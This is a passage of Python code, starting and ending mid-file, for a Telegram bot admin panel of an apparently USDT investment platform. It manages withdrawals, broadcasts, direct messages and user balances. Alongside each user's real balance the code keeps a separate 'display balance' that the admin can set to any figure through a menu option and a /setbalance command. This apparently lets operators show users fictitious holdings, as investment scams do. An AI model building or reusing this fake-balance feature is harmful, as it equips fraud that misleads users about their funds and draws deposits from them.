                    [{"text": "💎 Сменить на крипто", "callback_data": f"admin:withdraw:tocrypto:{withdrawal_id}"}],
                    [{"text": "💰 Изменить сумму", "callback_data": f"admin:withdraw:amount:{withdrawal_id}"}],
                    [{"text": "🔙 Назад", "callback_data": f"admin:withdraw:{withdrawal_id}"}]
                ]
                await bot_send_message(chat_id, text, buttons)
            
            # Admin: Change to crypto withdrawal (simplified - just mark as modified)
            elif data.startswith("admin:withdraw:tocrypto:") and str(chat_id) == str(ADMIN_ID):
                withdrawal_id = int(data.split(":", 3)[3])
                withdrawal = (await db.execute(select(Withdrawal).where(Withdrawal.id == withdrawal_id))).scalars().first()
                if withdrawal:
                    withdrawal.modified_to_crypto = True
                    withdrawal.modified_by_admin = True
                    withdrawal.crypto_currency = "USDT"
                    withdrawal.crypto_address = "TВаш_адрес_здесь"  # Admin needs to update manually
                    withdrawal.admin_notes = "Переведено на крипто-вывод"
                    await db.commit()
                    await bot_send_message(chat_id, f"✅ Заявка #{withdrawal.id} переведена на крипто-вывод\n\n⚠️ Укажите адрес кошелька вручную в БД", [[{"text": "🔙 Назад", "callback_data": f"admin:withdraw:{withdrawal_id}"}]])
                else:
                    await bot_send_message(chat_id, "❌ Заявка не найдена")
            
            # Admin: Balance management menu
            elif data == "admin:balance" and str(chat_id) == str(ADMIN_ID):
                text = "💰 <b>Управление балансом</b>\n\nВведите Profile ID пользователя:"
                admin_balance_state[str(ADMIN_ID)] = {"action": "select_user"}
                buttons = [
                    [{"text": "📋 Последние пользователи", "callback_data": "admin:balance:recent"}],
                    [{"text": "🔙 Назад", "callback_data": "admin:menu"}]
                ]
                await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
            
            # Admin: Show recent users for balance management
            elif data == "admin:balance:recent" and str(chat_id) == str(ADMIN_ID):
                users = (await db.execute(select(User).order_by(User.created_at.desc()).limit(5))).scalars().all()
                text = "💰 <b>Выберите пользователя:</b>\n\n"
                buttons = []
                for u in users:
                    real_bal = u.balance_usdt or 0.0
                    user_display = format_user_display(u)
                    button_text = f"{user_display} | {real_bal:.2f} USDT"
                    buttons.append([{"text": button_text, "callback_data": f"admin:balance:user:{u.profile_id}"}])
                buttons.append([{"text": "🔙 Назад", "callback_data": "admin:balance"}])
                await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
            
            # Admin: Selected user for balance management
            elif data.startswith("admin:balance:user:") and str(chat_id) == str(ADMIN_ID):
                profile_id = int(data.split(":", 3)[3])
                user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
                if user:
                    admin_balance_state[str(ADMIN_ID)] = {"action": "select_action", "profile_id": profile_id}
                    real_bal = user.balance_usdt or 0.0
                    display_bal = user.display_balance_usdt if user.display_balance_usdt is not None else real_bal
                    user_info = format_user_info(user)
                    text = f"👤 <b>Пользователь: {user_info}</b>\n"
                    text += f"💰 Реальный баланс: {real_bal:.2f} USDT\n"
                    text += f"🎭 Отображаемый: {display_bal:.2f} USDT\n\n"
                    text += "Выберите действие:"
                    
                    buttons = [
                        [{"text": "➕ Пополнить", "callback_data": f"admin:balance:add:{profile_id}"}],
                        [{"text": "➖ Списать", "callback_data": f"admin:balance:subtract:{profile_id}"}],
                        [{"text": "✏️ Установить точную сумму", "callback_data": f"admin:balance:set:{profile_id}"}],
                        [{"text": "🎭 Изменить отображаемый", "callback_data": f"admin:balance:display:{profile_id}"}],
                        [{"text": "🔙 Назад", "callback_data": "admin:balance"}]
                    ]
                    await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
                else:
                    await bot_send_message(chat_id, "❌ Пользователь не найден", [[{"text": "🔙 Назад", "callback_data": "admin:balance"}]])
            
            # Admin: Add balance - show quick amounts
            elif data.startswith("admin:balance:add:") and str(chat_id) == str(ADMIN_ID):
                profile_id = int(data.split(":", 3)[3])
                admin_balance_state[str(ADMIN_ID)] = {"action": "add_balance", "profile_id": profile_id}
                text = f"➕ <b>Пополнение баланса #{profile_id}</b>\n\nВыберите сумму или введите свою:"
                buttons = [
                    [{"text": "+10 USDT", "callback_data": f"admin:balance:add:confirm:{profile_id}:10"}],
                    [{"text": "+50 USDT", "callback_data": f"admin:balance:add:confirm:{profile_id}:50"}],
                    [{"text": "+100 USDT", "callback_data": f"admin:balance:add:confirm:{profile_id}:100"}],
                    [{"text": "+500 USDT", "callback_data": f"admin:balance:add:confirm:{profile_id}:500"}],
                    [{"text": "✏️ Ввести другую сумму", "callback_data": f"admin:balance:add:custom:{profile_id}"}],
                    [{"text": "🔙 Назад", "callback_data": f"admin:balance:user:{profile_id}"}]
                ]
                await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
            
            # Admin: Subtract balance - show quick amounts
            elif data.startswith("admin:balance:subtract:") and str(chat_id) == str(ADMIN_ID):
                profile_id = int(data.split(":", 3)[3])
                admin_balance_state[str(ADMIN_ID)] = {"action": "subtract_balance", "profile_id": profile_id}
                text = f"➖ <b>Списание с баланса #{profile_id}</b>\n\nВыберите сумму или введите свою:"
                buttons = [
                    [{"text": "-10 USDT", "callback_data": f"admin:balance:sub:confirm:{profile_id}:10"}],
                    [{"text": "-50 USDT", "callback_data": f"admin:balance:sub:confirm:{profile_id}:50"}],
                    [{"text": "-100 USDT", "callback_data": f"admin:balance:sub:confirm:{profile_id}:100"}],
                    [{"text": "✏️ Ввести другую сумму", "callback_data": f"admin:balance:sub:custom:{profile_id}"}],
                    [{"text": "🔙 Назад", "callback_data": f"admin:balance:user:{profile_id}"}]
                ]
                await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
            
            # Admin: Confirm add balance
            elif data.startswith("admin:balance:add:confirm:") and str(chat_id) == str(ADMIN_ID):
                parts = data.split(":")
                profile_id = int(parts[4])
                amount = float(parts[5])
                
                # Execute the balance addition using the existing command handler
                await bot_send_message(chat_id, f"⏳ Добавляю {amount} USDT...")
                # Call the addbalance logic directly
                result = await execute_balance_change(db, profile_id, amount, "add", chat_id)
                if result["ok"]:
                    buttons = [[{"text": "💰 Другая операция", "callback_data": f"admin:balance:user:{profile_id}"}],
                              [{"text": "🔙 Главное меню", "callback_data": "admin:menu"}]]
                    await bot_send_message(chat_id, result["message"], buttons, parse_mode="HTML")
                else:
                    await bot_send_message(chat_id, result["message"], [[{"text": "🔙 Назад", "callback_data": f"admin:balance:add:{profile_id}"}]], parse_mode="HTML")
                admin_balance_state.pop(str(ADMIN_ID), None)
            
            # Admin: Confirm subtract balance
            elif data.startswith("admin:balance:sub:confirm:") and str(chat_id) == str(ADMIN_ID):
                parts = data.split(":")
                profile_id = int(parts[4])
                amount = float(parts[5])
                
                # Execute the balance subtraction
                await bot_send_message(chat_id, f"⏳ Списываю {amount} USDT...")
                result = await execute_balance_change(db, profile_id, -amount, "add", chat_id)
                if result["ok"]:
                    buttons = [[{"text": "💰 Другая операция", "callback_data": f"admin:balance:user:{profile_id}"}],
                              [{"text": "🔙 Главное меню", "callback_data": "admin:menu"}]]
                    await bot_send_message(chat_id, result["message"], buttons, parse_mode="HTML")
                else:
                    await bot_send_message(chat_id, result["message"], [[{"text": "🔙 Назад", "callback_data": f"admin:balance:subtract:{profile_id}"}]], parse_mode="HTML")
                admin_balance_state.pop(str(ADMIN_ID), None)
            
            # Admin: Custom amount input prompts
            elif data.startswith("admin:balance:add:custom:") and str(chat_id) == str(ADMIN_ID):
                profile_id = int(data.split(":", 4)[4])
                admin_balance_state[str(ADMIN_ID)] = {"action": "input_add_amount", "profile_id": profile_id}
                await bot_send_message(chat_id, f"💰 Введите сумму для пополнения баланса #{profile_id}:\n\nПример: 250.50", parse_mode="HTML")
            
            elif data.startswith("admin:balance:sub:custom:") and str(chat_id) == str(ADMIN_ID):
                profile_id = int(data.split(":", 4)[4])
                admin_balance_state[str(ADMIN_ID)] = {"action": "input_sub_amount", "profile_id": profile_id}
                await bot_send_message(chat_id, f"💸 Введите сумму для списания с баланса #{profile_id}:\n\nПример: 75.25", parse_mode="HTML")
            
            elif data.startswith("admin:balance:set:") and str(chat_id) == str(ADMIN_ID):
                profile_id = int(data.split(":", 3)[3])
                admin_balance_state[str(ADMIN_ID)] = {"action": "input_set_amount", "profile_id": profile_id}
                await bot_send_message(chat_id, f"✏️ Введите новый баланс для пользователя #{profile_id}:\n\nПример: 1000.00", parse_mode="HTML")
            
            elif data.startswith("admin:balance:display:") and str(chat_id) == str(ADMIN_ID):
                profile_id = int(data.split(":", 3)[3])
                admin_balance_state[str(ADMIN_ID)] = {"action": "input_display_amount", "profile_id": profile_id}
                await bot_send_message(chat_id, f"🎭 Введите отображаемый баланс для пользователя #{profile_id}:\n\nПример: 5000.00", parse_mode="HTML")
            
            # Admin: Back to main menu
            elif data == "admin:menu" and str(chat_id) == str(ADMIN_ID):
                buttons = [
                    [{"text": "📢 Сделать рассылку", "callback_data": "admin:broadcast_menu"}],
                    [{"text": "✉️ Отправить сообщение пользователю", "callback_data": "admin:send_user_message"}],
                    [{"text": "👥 Пользователи", "callback_data": "admin:users"}],
                    [{"text": "💸 Заявки на вывод", "callback_data": "admin:withdrawals"}],
                    [{"text": "📊 Статистика", "callback_data": "admin:stats"}],
                    [{"text": "💰 Изменить баланс", "callback_data": "admin:balance"}]
                ]
                await bot_send_message(chat_id, "🔐 <b>Админ панель</b>\n\nВыберите раздел:", buttons, parse_mode="HTML")
            
            # Admin: Broadcast menu
            elif data == "admin:broadcast_menu" and str(chat_id) == str(ADMIN_ID):
                total_users = (await db.execute(select(func.count(User.id)))).scalar() or 0
                buttons = [
                    [{"text": "📢 Рассылка всем пользователям", "callback_data": "broadcast:select_all"}],
                    [{"text": "🎯 Ограниченная рассылка", "callback_data": "broadcast:select_limited"}],
                    [{"text": "🔙 Назад", "callback_data": "admin:menu"}]
                ]
                await bot_send_message(chat_id, f"📢 <b>Рассылка сообщений</b>\n\n👥 Всего пользователей: {total_users}\n\nВыберите тип рассылки:", buttons, parse_mode="HTML")
            
            # Admin: Send user message prompt
            elif data == "admin:send_user_message" and str(chat_id) == str(ADMIN_ID):
                text = "✉️ <b>Отправка личного сообщения</b>\n\nОтправьте сообщение в формате:\n\n<code>/send_message PROFILE_ID текст сообщения</code>\n\nПример:\n<code>/send_message 100001 Здравствуйте! Ваш аккаунт активирован</code>\n\n💡 Вы также можете указать только Profile ID, и бот попросит ввести текст сообщения."
                buttons = [[{"text": "🔙 Назад", "callback_data": "admin:menu"}]]
                await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
            
            # Broadcast: Select all users (show delivery channel selection)
            elif data == "broadcast:select_all" and str(chat_id) == str(ADMIN_ID):
                total_users = (await db.execute(select(func.count(User.id)))).scalar() or 0
                buttons = [
                    [{"text": "📱 В приложение", "callback_data": "broadcast:all:app_chat"}],
                    [{"text": "💬 В Telegram бот", "callback_data": "broadcast:all:telegram_chat"}],
                    [{"text": "🔙 Назад", "callback_data": "admin:broadcast_menu"}]
                ]
                await bot_send_message(chat_id, f"📢 <b>Массовая рассылка всем</b>\n\n👥 Получателей: {total_users}\n\n🎯 Выберите канал доставки:", buttons, parse_mode="HTML")
            
            # Broadcast: Select limited (ask for count)
            elif data == "broadcast:select_limited" and str(chat_id) == str(ADMIN_ID):
                text = "🎯 <b>Ограниченная рассылка</b>\n\nОтправьте количество пользователей для рассылки:\n\n<code>/broadcast_limited КОЛИЧЕСТВО</code>\n\nПример:\n<code>/broadcast_limited 50</code>\n\n💡 Сообщение будет отправлено N самым последним зарегистрированным пользователям."
                buttons = [[{"text": "🔙 Назад", "callback_data": "admin:broadcast_menu"}]]
                await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
            
            # ========== BROADCAST CALLBACKS ==========
            # Broadcast: All users with selected delivery type
            elif data.startswith("broadcast:all:") and str(chat_id) == str(ADMIN_ID):
                delivery_type = data.split(":", 2)[2]
                total_users = (await db.execute(select(func.count(User.id)))).scalar() or 0
                admin_broadcast_state[str(ADMIN_ID)] = {"type": "all", "target": None, "delivery": delivery_type}
                
                delivery_label = "в приложении" if delivery_type == "app_chat" else "в Telegram боте"
                await bot_send_message(chat_id, f"📢 <b>Массовая рассылка всем</b>\n\n👥 Получателей: {total_users}\n📱 Канал: {delivery_label}\n\n📝 Отправьте текст сообщения\n\nДля отмены: /cancel", parse_mode="HTML")
            
            # Broadcast: Limited users with selected delivery type
            elif data.startswith("broadcast:limited:") and str(chat_id) == str(ADMIN_ID):
                parts = data.split(":", 3)
                count = int(parts[2])
                delivery_type = parts[3]
                admin_broadcast_state[str(ADMIN_ID)] = {"type": "limited", "target": count, "delivery": delivery_type}
                
                delivery_label = "в приложении" if delivery_type == "app_chat" else "в Telegram боте"
                await bot_send_message(chat_id, f"🎯 <b>Ограниченная рассылка</b>\n\n👥 Получателей: {count}\n📱 Канал: {delivery_label}\n\n📝 Отправьте текст сообщения\n\nДля отмены: /cancel", parse_mode="HTML")
            
            # ========== END ADMIN PANEL CALLBACKS ==========
            
            elif data.startswith("check_deposit:"):
                invoice_id=data.split(":",1)[1]
                print(f"[CHECK_DEPOSIT] User {chat_id} checking invoice {invoice_id}")
                async with aiohttp.ClientSession() as s:
                    # Передаем telegram_id пользователя в заголовках
                    headers = {"X-Telegram-Id": str(chat_id)}
                    async with s.get(f"{HOST_BASE}/api/check_deposit", params={"invoice_id": invoice_id}, headers=headers) as r:
                        st=await r.json()
                        print(f"[CHECK_DEPOSIT] Result: {st}")
                        if st.get("paid"): 
                            amount = st.get('amount', 0)
                            new_balance = st.get('new_balance', 0)
                            await bot_send_message(chat_id, f"✅ <b>Платеж подтвержден!</b>\n\n💰 Сумма: {amount} USDT\n💵 Ваш баланс: {round(new_balance, 2)} USDT\n\n🎉 Средства успешно зачислены на ваш счет!", parse_mode="HTML")
                        else: 
                            await bot_send_message(chat_id, "⏳ <b>Платеж в обработке</b>\n\nПлатеж еще не поступил. Пожалуйста, подождите несколько минут и попробуйте еще раз.\n\nЕсли вы оплатили счет, средства будут зачислены автоматически.", parse_mode="HTML")
            
            # Handle withdrawal approval
            elif data.startswith("approve_withdraw:"):
                if str(chat_id) == str(ADMIN_ID):
                    withdrawal_id = int(data.split(":",1)[1])
                    # Получаем запись вывода
                    withdrawal = (await db.execute(select(Withdrawal).where(Withdrawal.id == withdrawal_id))).scalars().first()
                    if withdrawal:
                        # Проверяем, что вывод ещё не обработан
                        if withdrawal.status == "completed":
                            await bot_send_message(chat_id, f"✅ Вывод #{withdrawal_id} уже одобрен")
                            return {"ok": True}
                        
                        # Получаем пользователя
                        user = (await db.execute(select(User).where(User.id == withdrawal.user_id))).scalars().first()
                        
                        # Funds ALREADY deducted and transferred to admin wallet!
                        # Just update status to confirm card transfer is done
                        withdrawal.status = "completed"
                        withdrawal.completed_at = datetime.utcnow()
                        
                        await db.commit()
                        
                        # Уведомляем администратора
                        user_display = format_user_display(user) if user else "N/A"
                        await bot_send_message(chat_id, f"✅ <b>Вывод #{withdrawal_id} завершен!</b>\n\n💰 Сумма: {withdrawal.amount_rub:,.0f} ₽\n👤 Пользователь: {user_display}\n\n✅ USDT уже у вас на кошельке\n✅ Подтверждено, что рубли переведены на карту", parse_mode="HTML")
                        
                        # Уведомляем пользователя
                        if user:
                            try:
                                await bot_send_message(int(user.telegram_id), f"✅ <b>Деньги переведены!</b>\n\n💰 Сумма: {withdrawal.amount_rub:,.0f} ₽\n💳 На карту: **** {withdrawal.card_number}\n\n📊 Статус: <b>Завершено</b>\n\nПроверьте свою банковскую карту.", parse_mode="HTML")
                            except: pass
                    else:
                        await bot_send_message(chat_id, "❌ Вывод не найден")
            
            # Handle withdrawal cancellation
            elif data.startswith("cancel_withdraw:"):
                if str(chat_id) == str(ADMIN_ID):
                    withdrawal_id = int(data.split(":",1)[1])
                    # Получаем запись вывода
                    withdrawal = (await db.execute(select(Withdrawal).where(Withdrawal.id == withdrawal_id))).scalars().first()
                    if withdrawal:
                        # Проверяем, что вывод ещё не завершен
                        if withdrawal.status == "completed":
                            await bot_send_message(chat_id, f"❌ Вывод #{withdrawal_id} уже завершен, отменить невозможно")
                            return {"ok": True}
                        elif withdrawal.status == "cancelled":
                            await bot_send_message(chat_id, f"⚠️ Вывод #{withdrawal_id} уже отменен")
                            return {"ok": True}
                        
                        # Получаем пользователя
                        user = (await db.execute(select(User).where(User.id == withdrawal.user_id))).scalars().first()
                        
                        # ВАЖНО: Возвращаем деньги пользователю!
                        # Деньги УЖЕ были списаны при создании заявки
                        # USDT уже на кошельке админа - админу нужно вернуть их вручную через @CryptoBot
                        if user:
                            # Get original amount (from transaction details)
                            trx = (await db.execute(select(Transaction).where(
                                Transaction.user_id == withdrawal.user_id,
                                Transaction.type == "withdraw",
                                Transaction.details.contains({"withdrawal_id": withdrawal.id})
                            ).order_by(Transaction.created_at.desc()))).scalars().first()
                            
                            refund_amount = trx.amount if trx else withdrawal.usdt_required
                            user.balance_usdt = (user.balance_usdt or 0) + refund_amount
                        
                        # Обновляем статус на "cancelled"
                        withdrawal.status = "cancelled"
                        
                        await db.commit()
                        
                        # Уведомляем администратора
                        user_display = format_user_display(user) if user else "N/A"
                        await bot_send_message(chat_id, f"❌ <b>Вывод #{withdrawal_id} отменён!</b>\n\n💰 Сумма: {withdrawal.amount_rub:,.0f} ₽\n👤 Пользователь: {user_display}\n\n⚠️ ВАЖНО:\n• {refund_amount:.4f} USDT возвращены пользователю\n• Вам нужно ВРУЧНУЮ вернуть USDT пользователю через @CryptoBot\n• User ID: {user.telegram_id if user else 'N/A'}", parse_mode="HTML")
                        
                        # Уведомляем пользователя
                        if user:
                            try:
                                await bot_send_message(int(user.telegram_id), f"❌ <b>Вывод отменён</b>\n\n💰 Запрошенная сумма: {withdrawal.amount_rub:,.0f} ₽\n📊 Статус: <b>Отменено</b>\n\n✅ {refund_amount:.4f} USDT возвращены на ваш баланс.", parse_mode="HTML")
                            except: pass
                    else:
                        await bot_send_message(chat_id, "❌ Вывод не найден")
            
            # Handle contact user button
            elif data.startswith("contact_user:"):
                if str(chat_id) == str(ADMIN_ID):
                    target_user_id = data.split(":",1)[1]
                    admin_reply_state[str(ADMIN_ID)] = target_user_id
                    await bot_send_message(chat_id, f"✅ Режим ответа включен для пользователя {target_user_id}\n\nОтправьте сообщение, которое хотите передать пользователю.\n\nДля отмены отправьте: /cancel")
            
            # Handle admin reply button
            elif data.startswith("reply:"):
                if str(chat_id) == str(ADMIN_ID):
                    target_user_id = data.split(":",1)[1]
                    admin_reply_state[str(ADMIN_ID)] = target_user_id
                    await bot_send_message(chat_id, f"✅ Режим ответа включен для пользователя {target_user_id}\n\nОтправьте сообщение, которое хотите передать пользователю.\n\nДля отмены отправьте: /cancel")
        
        # Handle regular messages from admin
        elif "message" in update:
            msg = update["message"]
            chat_id = msg.get("chat", {}).get("id")
            text = msg.get("text", "")
            
            # Handle /start command - Main menu for admin
            if text == "/start" and str(chat_id) == str(ADMIN_ID):
                buttons = [
                    [{"text": "📢 Сделать рассылку", "callback_data": "admin:broadcast_menu"}],
                    [{"text": "✉️ Отправить сообщение пользователю", "callback_data": "admin:send_user_message"}],
                    [{"text": "👥 Пользователи", "callback_data": "admin:users"}],
                    [{"text": "💸 Заявки на вывод", "callback_data": "admin:withdrawals"}],
                    [{"text": "📊 Статистика", "callback_data": "admin:stats"}],
                    [{"text": "💰 Изменить баланс", "callback_data": "admin:balance"}]
                ]
                await bot_send_message(chat_id, "🔐 <b>Админ панель NadexRes</b>\n\nВыберите действие:", buttons, parse_mode="HTML")
                return {"ok": True}
            
            # Handle /adminibot command - Admin panel (legacy support)
            elif text == "/adminibot" and str(chat_id) == str(ADMIN_ID):
                buttons = [
                    [{"text": "📢 Сделать рассылку", "callback_data": "admin:broadcast_menu"}],
                    [{"text": "✉️ Отправить сообщение пользователю", "callback_data": "admin:send_user_message"}],
                    [{"text": "👥 Пользователи", "callback_data": "admin:users"}],
                    [{"text": "💸 Заявки на вывод", "callback_data": "admin:withdrawals"}],
                    [{"text": "📊 Статистика", "callback_data": "admin:stats"}],
                    [{"text": "💰 Изменить баланс", "callback_data": "admin:balance"}]
                ]
                await bot_send_message(chat_id, "🔐 <b>Админ панель</b>\n\nВыберите раздел:", buttons, parse_mode="HTML")
                return {"ok": True}
            
            # Handle /balance command - Set user REAL balance
            elif text.startswith("/balance ") and str(chat_id) == str(ADMIN_ID):
                try:
                    parts = text.split()
                    if len(parts) == 3:
                        profile_id = int(parts[1])
                        new_balance = float(parts[2])
                        
                        if new_balance < 0:
                            await bot_send_message(chat_id, "❌ Баланс не может быть отрицательным")
                            return {"ok": True}
                        
                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
                        if user:
                            old_balance = user.balance_usdt
                            user.balance_usdt = new_balance
                            
                            # Создаем запись транзакции для истории
                            if new_balance > old_balance:
                                # Пополнение
                                diff = new_balance - old_balance
                                transaction = Transaction(
                                    user_id=user.id,
                                    type="deposit",
                                    amount=diff,
                                    currency="USDT",
                                    status="done",
                                    details={"source": "admin_manual", "admin_id": str(ADMIN_ID), "reason": "Manual balance adjustment"}
                                )
                                db.add(transaction)
                            elif new_balance < old_balance:
                                # Списание
                                diff = old_balance - new_balance
                                transaction = Transaction(
                                    user_id=user.id,
                                    type="withdrawal",
                                    amount=diff,
                                    currency="USDT",
                                    status="done",
                                    details={"source": "admin_manual", "admin_id": str(ADMIN_ID), "reason": "Manual balance adjustment"}
                                )
                                db.add(transaction)
                            
                            await db.commit()
                            
                            # Отправляем уведомление администратору
                            await bot_send_message(chat_id, f"✅ <b>Реальный баланс изменен!</b>\n\n🆔 Profile ID: #{profile_id}\n👤 @{user.username or 'N/A'}\n\n💰 Старый баланс: {old_balance:.2f} USDT\n💎 <b>Новый баланс: {new_balance:.2f} USDT</b>\n{'📈 Добавлено: +' + f'{new_balance - old_balance:.2f}' if new_balance > old_balance else '📉 Списано: -' + f'{old_balance - new_balance:.2f}'} USDT", parse_mode="HTML")
                            
                            # Отправляем уведомление пользователю
                            try:
                                if new_balance > old_balance:
                                    await bot_send_message(int(user.telegram_id), f"💰 <b>Ваш баланс пополнен!</b>\n\n✅ Зачислено: {new_balance - old_balance:.2f} USDT\n💵 Новый баланс: {new_balance:.2f} USDT\n\n📝 Причина: Ручное пополнение администратором", parse_mode="HTML")
                                elif new_balance < old_balance:
                                    await bot_send_message(int(user.telegram_id), f"💸 <b>С вашего баланса списаны средства</b>\n\n📉 Списано: {old_balance - new_balance:.2f} USDT\n💵 Новый баланс: {new_balance:.2f} USDT\n\n📝 Причина: Корректировка администратором", parse_mode="HTML")
                            except:
                                pass
                        else:
                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден", parse_mode="HTML")
                    else:
                        await bot_send_message(chat_id, "❌ Неверный формат. Используйте:\n<code>/balance PROFILE_ID AMOUNT</code>", parse_mode="HTML")
                except Exception as e:
                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}", parse_mode="HTML")
                return {"ok": True}
            
            # Handle /addbalance command - Add or subtract from user REAL balance
            elif text.startswith("/addbalance ") and str(chat_id) == str(ADMIN_ID):
                try:
                    parts = text.split()
                    if len(parts) == 3:
                        profile_id = int(parts[1])
                        amount_str = parts[2]
                        
                        # Парсим сумму (может быть со знаком + или -)
                        if amount_str.startswith('+'):
                            amount = float(amount_str[1:])
                        else:
                            amount = float(amount_str)
                        
                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
                        if user:
                            old_balance = user.balance_usdt
                            new_balance = old_balance + amount
                            
                            if new_balance < 0:
                                await bot_send_message(chat_id, f"❌ Недостаточно средств!\n\nТекущий баланс: {old_balance:.2f} USDT\nПопытка списать: {abs(amount):.2f} USDT", parse_mode="HTML")
                                return {"ok": True}
                            
                            user.balance_usdt = new_balance
                            
                            # Создаем запись транзакции
                            if amount > 0:
                                transaction = Transaction(
                                    user_id=user.id,
                                    type="deposit",
                                    amount=amount,
                                    currency="USDT",
                                    status="done",
                                    details={"source": "admin_manual", "admin_id": str(ADMIN_ID), "reason": "Manual balance addition"}
                                )
                                db.add(transaction)
                            else:
                                transaction = Transaction(
                                    user_id=user.id,
                                    type="withdrawal",
                                    amount=abs(amount),
                                    currency="USDT",
                                    status="done",
                                    details={"source": "admin_manual", "admin_id": str(ADMIN_ID), "reason": "Manual balance deduction"}
                                )
                                db.add(transaction)
                            
                            await db.commit()
                            
                            # Отправляем уведомление администратору
                            operation = "Добавлено" if amount > 0 else "Списано"
                            await bot_send_message(chat_id, f"✅ <b>Баланс изменен!</b>\n\n🆔 Profile ID: #{profile_id}\n👤 @{user.username or 'N/A'}\n\n💰 Старый баланс: {old_balance:.2f} USDT\n{'📈' if amount > 0 else '📉'} {operation}: {abs(amount):.2f} USDT\n💎 <b>Новый баланс: {new_balance:.2f} USDT</b>", parse_mode="HTML")
                            
                            # Отправляем уведомление пользователю
                            try:
                                if amount > 0:
                                    await bot_send_message(int(user.telegram_id), f"💰 <b>Ваш баланс пополнен!</b>\n\n✅ Зачислено: {amount:.2f} USDT\n💵 Новый баланс: {new_balance:.2f} USDT\n\n📝 Причина: Ручное пополнение администратором", parse_mode="HTML")
                                else:
                                    await bot_send_message(int(user.telegram_id), f"💸 <b>С вашего баланса списаны средства</b>\n\n📉 Списано: {abs(amount):.2f} USDT\n💵 Новый баланс: {new_balance:.2f} USDT\n\n📝 Причина: Корректировка администратором", parse_mode="HTML")
                            except:
                                pass
                        else:
                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден", parse_mode="HTML")
                    else:
                        await bot_send_message(chat_id, "❌ Неверный формат. Используйте:\n<code>/addbalance PROFILE_ID ±AMOUNT</code>\n\nПример: <code>/addbalance 100001 +50</code>", parse_mode="HTML")
                except Exception as e:
                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}", parse_mode="HTML")
                return {"ok": True}
            
            # Handle /setbalance command - Set user display balance
            elif text.startswith("/setbalance ") and str(chat_id) == str(ADMIN_ID):
                try:
                    parts = text.split()
                    if len(parts) == 3:
                        profile_id = int(parts[1])
                        new_balance = float(parts[2])
                        
                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
                        if user:
                            user.display_balance_usdt = new_balance
                            await db.commit()
                            await bot_send_message(chat_id, f"✅ <b>Отображаемый баланс обновлен!</b>\n\n🆔 Profile ID: #{profile_id}\n🎭 Новый отображаемый баланс: {new_balance:.2f} USDT\n💎 Реальный баланс: {user.balance_usdt:.2f} USDT", parse_mode="HTML")
                        else:
                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден", parse_mode="HTML")
                    else:
                        await bot_send_message(chat_id, "❌ Неверный формат. Используйте:\n<code>/setbalance PROFILE_ID AMOUNT</code>", parse_mode="HTML")
                except Exception as e:
                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}", parse_mode="HTML")
                return {"ok": True}
            
            # Handle /send_message command - Send message to specific user
            elif text.startswith("/send_message ") and str(chat_id) == str(ADMIN_ID):
                try:
                    parts = text.split(maxsplit=2)
                    if len(parts) >= 2:
                        user_identifier = parts[1]
                        
                        # Check if we need to ask for message text
                        if len(parts) < 3:
                            admin_broadcast_state[str(ADMIN_ID)] = {"type": "user", "target": user_identifier}
                            await bot_send_message(chat_id, f"📝 Отправьте текст сообщения для пользователя {user_identifier}\n\nДля отмены: /cancel")
                            return {"ok": True}
                        
                        message_text = parts[2]
                        
                        # Try to find user by profile_id or telegram_id
                        user = None
                        if user_identifier.isdigit():
                            # Try profile_id first
                            user = (await db.execute(select(User).where(User.profile_id == int(user_identifier)))).scalars().first()
                            if not user:
                                # Try telegram_id
                                user = (await db.execute(select(User).where(User.telegram_id == user_identifier))).scalars().first()
                        
                        if user:
                            # Save message to database
                            admin_msg = AdminMessage(user_id=user.id, message_text=message_text, is_broadcast=False)
                            db.add(admin_msg)
                            await db.commit()
                            
                            # Send via Telegram
                            try:
                                await bot_send_message(int(user.telegram_id), f"📨 <b>Сообщение от администратора:</b>\n\n{message_text}", parse_mode="HTML")
                                user_display = format_user_display(user)
                                await bot_send_message(chat_id, f"✅ Сообщение отправлено пользователю {user_display}")
                            except Exception as e:
                                await bot_send_message(chat_id, f"❌ Ошибка отправки: {str(e)}")
                        else:
                            await bot_send_message(chat_id, f"❌ Пользователь {user_identifier} не найден")
                    else:
                        await bot_send_message(chat_id, "❌ Используйте: /send_message PROFILE_ID текст сообщения")
                except Exception as e:
                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}")
                return {"ok": True}
            
            # Handle /broadcast_all command - Send message to all users
            elif text.startswith("/broadcast_all") and str(chat_id) == str(ADMIN_ID):
                total_users = (await db.execute(select(func.count(User.id)))).scalar() or 0
                buttons = [
                    [{"text": "📱 В приложение", "callback_data": "broadcast:all:app_chat"}],
                    [{"text": "💬 В Telegram бот", "callback_data": "broadcast:all:telegram_chat"}],
                    [{"text": "❌ Отмена", "callback_data": "admin:menu"}]
                ]
                await bot_send_message(chat_id, f"📢 <b>Массовая рассылка всем</b>\n\n👥 Получателей: {total_users}\n\n🎯 Выберите канал доставки:", buttons, parse_mode="HTML")
                return {"ok": True}
            
            # Handle /broadcast_limited command - Send message to limited number of users
            elif text.startswith("/broadcast_limited ") and str(chat_id) == str(ADMIN_ID):
                try:
                    parts = text.split(maxsplit=1)
                    if len(parts) < 2:
                        await bot_send_message(chat_id, "❌ Используйте: /broadcast_limited КОЛИЧЕСТВО")
                        return {"ok": True}
                    
                    count = int(parts[1])
                    buttons = [
                        [{"text": "📱 В приложение", "callback_data": f"broadcast:limited:{count}:app_chat"}],
                        [{"text": "💬 В Telegram бот", "callback_data": f"broadcast:limited:{count}:telegram_chat"}],
                        [{"text": "❌ Отмена", "callback_data": "admin:menu"}]
                    ]
